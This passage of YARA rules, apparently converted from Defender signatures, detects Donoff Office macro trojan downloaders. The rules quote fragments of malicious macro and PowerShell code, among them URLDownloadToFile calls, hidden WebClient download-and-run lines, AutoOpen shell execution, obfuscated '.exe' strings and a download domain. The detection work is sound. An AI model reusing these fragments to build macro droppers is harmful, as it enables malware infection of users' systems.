        $x_1_2 = {2b 20 41 72 72 61 79 28 22 6c 6c 20 20 24 [0-16] 3d 27 5e [0-8] 27 3b [0-8] 22 29 28 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 76 6f 6b 65 2d [0-32] 22 29 28 30 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 [0-8] 2c 20 [0-16] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_5 = ", \"cmd.exe /c \"\"powershell  $" ascii //weight: 1
        $x_1_6 = {6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 [0-48] 2c 20 4e 61 4e 2c 20 4e 61 4e 2c}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 41 72 72 61 79 28 4e 61 4e 2c 20 [0-96] 2c 20 4e 61 4e 2c 20 4e 61 4e 2c 20 4e 61 4e 2c 20 4e 61 4e 2c 20 4e 61 4e 2c 20 4e 61 4e 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ET_2147720551_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ET"
        threat_id = "2147720551"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "p:\" + \"//\" + hammer + \"/" ascii //weight: 1
        $x_1_2 = ".ex\" + \"e}))" ascii //weight: 1
        $x_1_3 = "gamerton + \"e\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ET_2147720551_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ET"
        threat_id = "2147720551"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"vbscript.regexp\")" ascii //weight: 1
        $x_1_2 = ".Global = " ascii //weight: 1
        $x_1_3 = ".Pattern = " ascii //weight: 1
        $x_1_4 = {2e 52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
        $n_100_7 = "http://bkainline2/fileadmin" ascii //weight: -100
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PC_2147720761_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PC"
        threat_id = "2147720761"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 43 6f 6d 6d 65 6e 74 73 22 29 2e 56 61 6c 75 65 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PC_2147720761_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PC"
        threat_id = "2147720761"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"SYSTEMS" ascii //weight: 1
        $x_1_2 = "= \".jse" ascii //weight: 1
        $x_1_3 = "= Array(\"USERPROFILE\", \"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".ShellExecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EU_2147721040_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EU"
        threat_id = "2147721040"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ", \"WScript\" &" ascii //weight: 1
        $x_1_2 = {23 22 0d 0a 20 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e}  //weight: 1, accuracy: High
        $x_1_3 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 29 2e 52 75 6e 28 4d 6f 64 75 6c 65 31 2e [0-22] 28 [0-22] 2c 20 4c 54 72 69 6d 28 [0-22] 29 2c 20 22 22 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EU_2147721040_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EU"
        threat_id = "2147721040"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {4f 50 45 6e 28 29 3a 20 43 61 6c 6c 20 53 68 65 6c 6c 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 40 00 28 22 [0-16] 3d 22 29 29 2e 56 61 6c 75 65 2c 20 76 62 48 69 64 65 29 3a 20 45 6e 64 20 53 75 62}  //weight: 10, accuracy: Low
        $x_1_2 = "CreateObject(\"mSXml2.doMdoCUMENt" ascii //weight: 1
        $x_1_3 = "CreateObject(\"adodB.stream\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_EV_2147721106_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EV"
        threat_id = "2147721106"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 70 6c 69 74 28 22 [0-64] 2e 63 6f 2e 75 6b [0-144] 2e 43 6f 6d 6d 61 6e 64 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= GetObject(\"winmgmts:\\\\" ascii //weight: 1
        $x_1_3 = ".ExecQuery(\"SELECT * FROM Win32_VideoController\"," ascii //weight: 1
        $x_1_4 = "If ActiveDocument.Kind = 0 Then" ascii //weight: 1
        $x_1_5 = ".Environment" ascii //weight: 1
        $x_1_6 = "WScript.Arguments" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EW_2147721131_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EW"
        threat_id = "2147721131"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "_(ThisWorkbook.Sheets(\"Tope\").Range(\"G135\").Value)" ascii //weight: 1
        $x_1_2 = {43 61 73 65 20 [0-2] 20 58 6f 72 20 52 6f 75 6e 64 28 [0-4] 20 58 6f 72 20 [0-4] 29 20 58 6f 72 20 [0-2] 20 2f 20 52 6f 75 6e 64 28 [0-2] 20 2a 20 [0-2] 20 2f 20 [0-2] 29 20 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {5f 20 26 20 43 68 72 28 56 61 6c 28 43 68 72 28 28 28 [0-2] 20 2b 20 28 [0-2] 20 2d 20 [0-1] 29 29 20 2a 20 [0-1] 29 20 2d 20 [0-1] 29 20 26 20 43 68 72 28 [0-2] 20 2b 20 28 28 28 [0-1] 20 2a 20 [0-1] 20 2a 20 [0-1] 29 20 2f 20 [0-1] 29 20 2a 20 [0-1] 29 29 20 26 20 4d 69 64 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"^xe^  \"" ascii //weight: 1
        $x_1_2 = ".ex\" + \"e" ascii //weight: 1
        $x_1_3 = "($um.ToString(), $pp);" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"^.e^\" + \"x^e\" + \"^  \" &" ascii //weight: 1
        $x_1_2 = "$kos='t.we';$rem='ent).do" ascii //weight: 1
        $x_1_3 = "+$nim+'https://" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"powe\"" ascii //weight: 1
        $x_1_2 = "\"t.Web\"" ascii //weight: 1
        $x_1_3 = {2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 24 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-16] 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73}  //weight: 1, accuracy: Low
        $x_1_4 = "(\"WScript.Shell\").Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 24 20 [0-16] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = ").r'+'ePla'+'ce(([ChaR]" ascii //weight: 1
        $x_1_3 = "Sys'+'t'+'em.Net" ascii //weight: 1
        $x_1_4 = {2f 2c 68 74 74 70 3a 2f [0-4] 2b [0-4] 2f}  //weight: 1, accuracy: Low
        $x_1_5 = {27 2b 27 52 2e 65 78 65 [0-4] 27 2b 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shell sadd, n" ascii //weight: 1
        $x_1_2 = "Sub strings_attached(per2, ByRef arg1)" ascii //weight: 1
        $x_1_3 = "n = m -" ascii //weight: 1
        $x_1_4 = {64 6f 63 5f 70 72 69 6e 74 5f [0-11] 46 6f 72 6d 31 2e 54 65 78 74 31 2c 20 65 78 74 31 2c 20 [0-5] 5f 6d 61 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell Environ(StrConv(DecodeBase64(\"VGVtcA==\"), vbUnicode)) &" ascii //weight: 1
        $x_1_2 = "StrConv(DecodeBase64(\"XDYucGlm\"), vbUnicode), vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-16] 22 2c 20 [0-16] 2c 20 22 57 53 63 72 69 70 74 2e 22}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 22 53 68 65 6c 6c 22 29 2e 52 75 6e 28 4d 6f 64 75 6c 65 31 2e [0-16] 28 [0-16] 2c 20 22 22 29 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 41 72 72 61 79 28 [0-16] 2c 20 [0-16] 28 [0-16] 29 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {28 4d 69 64 28 [0-16] 2c 20 [0-16] 2c 20 31 29 29 20 2d 20 49 6e 74 28 4d 69 64 28 22 20 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {76 41 64 64 20 3d 20 22 7e 07 00 22}  //weight: 1, accuracy: Low
        $x_1_2 = {76 46 69 6c 65 4e 61 6d 65 20 3d 20 45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 04 00 5c 22}  //weight: 1, accuracy: Low
        $x_1_3 = "vFileName = vFileName + vAdd & \".e\" + \"x\" & \"e\"" ascii //weight: 1
        $x_1_4 = {7a 79 78 20 28 76 04 00 4e 61 6d 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = {49 66 20 4e 6f 74 20 46 69 6c 65 45 78 69 73 74 73 28 76 46 69 6c 65 4e 61 6d 65 29 20 54 68 65 6e 20 53 61 76 65 [0-6] 20 76 46 69 6c 65 4e 61 6d 65 2c 20 [0-10] 55 73 65 72 46 6f 72 6d 31 2e 4c 61 62 65 6c 32 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"powe\" + \"rshell -WindowStyle Hidden $" ascii //weight: 1
        $x_1_2 = "= new-o\" + \"bject System.Net.WebClient;$" ascii //weight: 1
        $x_1_3 = "= new-o\" + \"bject random;$str = '" ascii //weight: 1
        $x_1_4 = {3d 20 24 73 74 72 2e 53 70 6c 69 74 28 27 2c 27 29 3b 24 6e 61 6d 65 20 3d 20 24 0f 00 2e 6e 65 78 74 28 31 2c 20 36 35 35 33 36 29 3b 24}  //weight: 1, accuracy: Low
        $x_1_5 = "= $env:temp + '' + $name + '.exe';foreach($" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EX_2147732091_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EX"
        threat_id = "2147732091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 6e 6f 64 65 54 79 70 65 64 56 61 6c 75 65 29 02 00 53 65 74 20 30 00 20 3d 20 4e 6f 74 68 69 6e 67 02 00 53 65 74 20 30 00 20 3d 20 4e 6f 74 68 69 6e 67 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 4e 61 6d 65 02 00 6c 65 6e 67 68 74 20 3d 20 4c 65 6e 28 30 00 29 02 00 49 66 20 6c 65 6e 67 68 74 20 3e 20 32 35 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 32 20 54 68 65 6e 20 45 78 69 74 20 44 6f 02 00 10 00 20 00 20 28 20 00 29 02 00 10 00 4c 6f 6f 70 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 53 75 62 20 41 75 74 6f 43 6c 6f 73 65 28 29 02 00 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 20 00 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FK_2147732162_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FK"
        threat_id = "2147732162"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 44 62 6c 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 29 20 2a 20 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2a 20 4f 63 74 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 42 79 74 65 28 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2a 20 54 61 6e 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2f 20 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2b 20 43 4c 6e 67 28}  //weight: 1, accuracy: Low
        $x_10_3 = "+ Shell(" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_FA_2147732258_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FA!vta"
        threat_id = "2147732258"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "vta: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".\" & StrReverse(\"e\" & \"xe\")" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA 0&, Replace(" ascii //weight: 1
        $x_2_3 = {22 2c 20 22 22 29 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? [0-32] 2c 20 30 26 2c 20 30 26}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_FA_2147732258_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FA!vta"
        threat_id = "2147732258"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "vta: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Environ(\"TMP\") & \"\\\" & \"myfileepepe.exe" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileW 0&, StrPtr(Replace(" ascii //weight: 1
        $x_1_3 = "\", \"\")), StrPtr(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FE_2147732259_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FE!vta"
        threat_id = "2147732259"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "vta: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2b 24 68 69 74 2b 24 6e 69 6d 2b 27 68 74 74 70 3a 2f 2f 6e 6f 6e 75 64 6f 6b 61 2e 74 6f 70 2f [0-16] 27 2b 24 66 6f 73 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FF_2147732260_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FF"
        threat_id = "2147732260"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"ap\" & \"pdata\") & \"\\ggg1\" &" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileW(0&, StrPtr(Replace" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FF_2147732261_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FF!vta"
        threat_id = "2147732261"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "vta: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"app\" & \"\" & \"data\") & \"\\" ascii //weight: 1
        $x_1_2 = ".e\" & \"x\" & \"e" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileW(0&, StrPtr(Replace(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FI_2147732262_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FI"
        threat_id = "2147732262"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 6e 28 [0-20] 29 20 (2b|2d) 20 41 74 6e 28 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 54 72 69 6d 28 22 [0-32] 22 29 20 2b 20 4c 54 72 69 6d 28 22 [0-32] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Application.Run \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FJ_2147732263_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FJ"
        threat_id = "2147732263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 6f 73 28 [0-20] 29 20 (2b|2d) 20 41 63 6f 73 28 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 54 72 69 6d 28 22 [0-32] 22 29 20 2b 20 4c 54 72 69 6d 28 22 [0-32] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Application.Run \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FJ_2147732263_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FJ"
        threat_id = "2147732263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2d 20 43 6f 73 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 29 20 2a 20 31 20 2d 20 43 68 72 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2f 20 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2d 20 43 68 72 42 28}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 53 6e 67 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2b 20 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2f 20 53 69 6e 28 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2d 20 43 42 79 74 65 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FL_2147732264_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FL"
        threat_id = "2147732264"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
